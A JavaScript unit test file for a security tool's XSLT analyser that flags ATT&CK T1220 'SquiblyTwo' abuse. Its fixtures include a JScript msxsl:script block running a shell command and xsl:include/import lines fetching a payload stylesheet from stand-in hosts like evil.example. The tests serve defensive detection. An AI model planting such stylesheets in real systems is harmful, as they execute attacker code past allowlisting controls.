'use strict';
// xslt-renderer.test.js — XSLT stylesheet (.xsl / .xslt) analyser.
//
// Threat surface: ATT&CK T1220 (Signed Binary Proxy Execution) via
// `wmic.exe /format:<url>` or `msxsl.exe <doc> <url>` ("SquiblyTwo").
// The signed Microsoft binaries fetch and execute attacker-controlled
// XSL, bypassing AppLocker / WDAC.
//
// These tests verify:
//   • Format banner emitted (medium)
//   • <msxsl:script language="…"> → high
//   • <xsl:include href="http://…"> → high + URL IOC
//   • <xsl:import href="\\…"> → high + UNC_PATH IOC
//   • document("http://…") → medium + URL IOC
//   • Benign XSLT (local refs only) → medium (banner only)
//   • Detections mirror to externalRefs as IOC.PATTERN

const test = require('node:test');
const assert = require('node:assert/strict');
const { loadModules } = require('../helpers/load-bundle.js');

const ctx = loadModules(
  ['src/constants.js', 'src/renderers/xslt-renderer.js'],
  { expose: ['XsltRenderer', 'IOC', 'escalateRisk'] },
);
const { XsltRenderer, IOC } = ctx;

function bufFor(text) {
  return new TextEncoder().encode(text).buffer;
}

const XSL_HEAD = '<?xml version="1.0"?>\n'
  + '<xsl:stylesheet version="1.0" '
  + 'xmlns:xsl="http://www.w3.org/1999/XSL/Transform" '
  + 'xmlns:msxsl="urn:schemas-microsoft-com:xslt">\n';
const XSL_TAIL = '\n</xsl:stylesheet>';

test('xslt: format banner emitted', () => {
  const xml = XSL_HEAD + '<xsl:template match="/"><html/></xsl:template>' + XSL_TAIL;
  const r = new XsltRenderer();
  const f = r.analyzeForSecurity(bufFor(xml), 'a.xsl');
  const banner = f.externalRefs.find(x =>
    x.type === IOC.PATTERN && /XSLT Stylesheet/.test(x.url));
  assert.ok(banner, `expected banner, got: ${JSON.stringify(f.externalRefs)}`);
  assert.equal(banner.severity, 'medium');
});

test('xslt: <msxsl:script> escalates to high (T1220 SquiblyTwo)', () => {
  const xml = XSL_HEAD
    + '<msxsl:script language="JScript" implements-prefix="user">\n'
    + '<![CDATA[\n'
    + 'var sh = new ActiveXObject("WScript.Shell"); sh.Run("calc.exe");\n'
    + ']]>\n'
    + '</msxsl:script>\n'
    + XSL_TAIL;
  const r = new XsltRenderer();
  const f = r.analyzeForSecurity(bufFor(xml), 'evil.xsl');
  assert.equal(f.risk, 'high');
  const det = f.externalRefs.find(x =>
    x.type === IOC.PATTERN && /msxsl:script/.test(x.url));
  assert.ok(det);
  assert.equal(det.severity, 'high');
  assert.match(det.url, /JScript/);
});

test('xslt: <msxsl:script language="C#"> also detected', () => {
  const xml = XSL_HEAD
    + '<msxsl:script language="C#"><![CDATA[ … ]]></msxsl:script>\n'
    + XSL_TAIL;
  const r = new XsltRenderer();
  const f = r.analyzeForSecurity(bufFor(xml), 'a.xsl');
  const det = f.externalRefs.find(x =>
    x.type === IOC.PATTERN && /msxsl:script/.test(x.url));
  assert.ok(det);
  assert.match(det.url, /C#/);
});

test('xslt: <xsl:include href="http://…"> fires high + URL IOC', () => {
  const xml = XSL_HEAD
    + '<xsl:include href="http://evil.example/payload.xsl"/>\n'
    + XSL_TAIL;
  const r = new XsltRenderer();
  const f = r.analyzeForSecurity(bufFor(xml), 'a.xsl');
  assert.equal(f.risk, 'high');
  const det = f.externalRefs.find(x =>
    x.type === IOC.PATTERN && /remote URL/.test(x.url));
  assert.ok(det);
  assert.equal(det.severity, 'high');
  const allRefs = [...(f.externalRefs || []), ...(f.interestingStrings || [])];
  const url = allRefs.find(x =>
    x.type === IOC.URL && x.url === 'http://evil.example/payload.xsl');
  assert.ok(url, 'expected URL IOC');
});

test('xslt: <xsl:import href="\\\\…"> fires high + UNC_PATH IOC', () => {
  // JS string `\\\\` = 2 literal backslashes (UNC `\\` prefix).
  const xml = XSL_HEAD
    + '<xsl:import href="\\\\evil.example\\share\\payload.xsl"/>\n'
    + XSL_TAIL;
  const r = new XsltRenderer();
  const f = r.analyzeForSecurity(bufFor(xml), 'a.xsl');
  assert.equal(f.risk, 'high');
  const det = f.externalRefs.find(x =>
    x.type === IOC.PATTERN && /UNC path/.test(x.url));
  assert.ok(det);
  const allRefs = [...(f.externalRefs || []), ...(f.interestingStrings || [])];
  assert.ok(allRefs.some(x => x.type === IOC.UNC_PATH));
});

test('xslt: document("http://…") fires medium + URL IOC', () => {
  const xml = XSL_HEAD
    + '<xsl:variable name="data" select="document(\'http://example.com/data.xml\')"/>\n'
    + XSL_TAIL;
  const r = new XsltRenderer();
  const f = r.analyzeForSecurity(bufFor(xml), 'a.xsl');
  assert.equal(f.risk, 'medium', 'document() with http URL should be medium not high');
  const det = f.externalRefs.find(x =>
    x.type === IOC.PATTERN && /document\(\)/.test(x.url));
  assert.ok(det);
  assert.equal(det.severity, 'medium');
  const allRefs = [...(f.externalRefs || []), ...(f.interestingStrings || [])];
  assert.ok(allRefs.some(x => x.type === IOC.URL));
});

test('xslt: benign stylesheet (no script, no remote refs) → medium banner', () => {
  const xml = XSL_HEAD
    + '<xsl:template match="/"><html><body><xsl:value-of select="@name"/></body></html></xsl:template>'
    + XSL_TAIL;
  const r = new XsltRenderer();
  const f = r.analyzeForSecurity(bufFor(xml), 'a.xsl');
  assert.equal(f.risk, 'medium');
  assert.equal(f.externalRefs.filter(x => x.severity === 'high').length, 0);
});

test('xslt: document("") (self-reference) does NOT fire', () => {
  // document('') with empty string is the legitimate "current document"
  // pattern. We only flag explicit http/UNC URIs.
  const xml = XSL_HEAD
    + '<xsl:variable name="self" select="document(\'\')"/>\n'
    + XSL_TAIL;
  const r = new XsltRenderer();
  const f = r.analyzeForSecurity(bufFor(xml), 'a.xsl');
  assert.equal(f.risk, 'medium');
});

test('xslt: _summarize counts scripts and remote refs', () => {
  const xml = XSL_HEAD
    + '<msxsl:script language="JScript">x</msxsl:script>\n'
    + '<xsl:include href="http://e.example/a.xsl"/>\n'
    + '<xsl:include href="local.xsl"/>\n'
    + XSL_TAIL;
  const out = XsltRenderer._summarize(xml);
  assert.equal(out.scripts, 1);
  assert.equal(out.remoteRefs, 1, 'only the http href counts as remote');
  assert.equal(out.remoteList[0].value, 'http://e.example/a.xsl');
});

test('xslt: detections mirror to externalRefs as IOC.PATTERN', () => {
  const xml = XSL_HEAD
    + '<msxsl:script language="JScript">x</msxsl:script>\n'
    + '<xsl:include href="http://e.example/a.xsl"/>\n'
    + XSL_TAIL;
  const r = new XsltRenderer();
  const f = r.analyzeForSecurity(bufFor(xml), 'a.xsl');
  const patterns = f.externalRefs.filter(x => x.type === IOC.PATTERN);
  assert.ok(patterns.length >= 3, `expected ≥3 patterns, got ${patterns.length}`);
});

test('xslt: all hits use IOC.* constants (no bare strings)', () => {
  const xml = XSL_HEAD
    + '<msxsl:script language="JScript">x</msxsl:script>\n'
    + '<xsl:include href="http://e.example/a.xsl"/>\n'
    + XSL_TAIL;
  const r = new XsltRenderer();
  const f = r.analyzeForSecurity(bufFor(xml), 'a.xsl');
  const allowed = ['Pattern', 'URL', 'UNC Path', 'Crypto Address', 'Secret', 'Hostname', 'Domain'];
  for (const e of f.externalRefs) {
    assert.ok(allowed.includes(e.type), `unexpected type: ${e.type}`);
  }
});
